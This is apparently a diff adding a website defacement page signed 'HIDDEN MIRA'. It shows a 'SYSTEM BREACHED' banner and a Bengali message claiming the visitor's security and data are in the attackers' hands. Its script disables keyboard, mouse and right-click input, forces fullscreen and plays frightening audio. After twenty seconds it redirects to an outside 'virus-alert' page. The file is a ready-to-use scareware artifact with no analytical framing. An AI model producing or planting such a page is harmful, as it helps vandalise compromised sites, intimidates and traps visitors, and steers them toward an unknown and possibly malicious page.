@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>!! SYSTEM BREACHED !!</title>
+
+    <meta name="title" content="System Hacked By HIDDEN MIRA">
+    <meta name="description" content="Your Security is an Illusion!">
+    <meta name="keywords" content="hacked,deface,website,hacker,dangerous,attack">
+    <meta name="author" content="HIDDEN MIRA">
+    
+    <meta property="og:image" content="https://envs.sh/1Xp.jpg">
+    <meta name="theme-color" content="#ff0000">
+    
+    <link rel="icon" type="image/png" href="https://envs.sh/1Xp.jpg">
+    <link href="https://fonts.googleapis.com/css2?family=Reggae+One&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Reggae One', cursive;
+        }
+        body {
+            background: black;
+            color: white;
+            text-align: center;
+            overflow: hidden;
+        }
+        #background-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            z-index: -2;
+        }
+        .static-glitch {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: url("https://envs.sh/static.gif");
+            opacity: 0.2;
+            z-index: -1;
+        }
+        .container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            animation: red-flash 1.5s infinite alternate;
+        }
+        @keyframes red-flash {
+            0% { filter: brightness(1); }
+            100% { filter: brightness(2); }
+        }
+        .hacker-text {
+            font-size: 45px;
+            color: red;
+            text-shadow: 2px 2px 5px black;
+            animation: typing 2s steps(30, end);
+            white-space: nowrap;
+            overflow: hidden;
+            display: inline-block;
+            border-right: 3px solid red;
+        }
+        @keyframes typing {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+        .message {
+            font-size: 20px;
+            margin-top: 10px;
+            font-weight: bold;
+            text-transform: uppercase;
+            color: #ff0000;
+        }
+        .profile-img {
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            border: 3px solid red;
+            box-shadow: 0px 0px 15px red;
+            animation: shake 1s infinite alternate;
+        }
+        @keyframes shake {
+            0% { transform: translateX(2px); }
+            100% { transform: translateX(-2px); }
+        }
+    </style>
+</head>
+<body oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" onclick="fs(); playSound();">
+
+    <video id="background-video" autoplay loop muted>
+        <source src="https://envs.sh/wuo.mp4" type="video/mp4">
+    </video>
+    <div class="static-glitch"></div>
+    
+    <div class="container">
+        <img src="https://envs.sh/wua.jpg" alt="Profile Image" class="profile-img">
+        <h2 class="hacker-text">HACKED BY HIDDEN MIRA</h2>
+        <p class="message">আপনার সিকিউরিটি এখন আমাদের হাতে!<br> আপনার সকল তথ্য আমাদের কাছে আছে!</p>
+    </div>
+
+    <audio id="scary-audio" src="https://envs.sh/scary.mp3"></audio>
+
+    <script>
+        function fs() {
+            var elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
+            } else if (elem.mozRequestFullScreen) {
+                elem.mozRequestFullScreen();
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            }
+            document.onkeydown = function(e) {
+                return false;
+            };
+        }
+
+        function playSound() {
+            var audio = document.getElementById("scary-audio");
+            audio.play();
+        }
+
+        setTimeout(function() {
+            window.location.href = "https://envs.sh/virus-alert.html";
+        }, 20000);
+    </script>
+
+</body>
+</html>
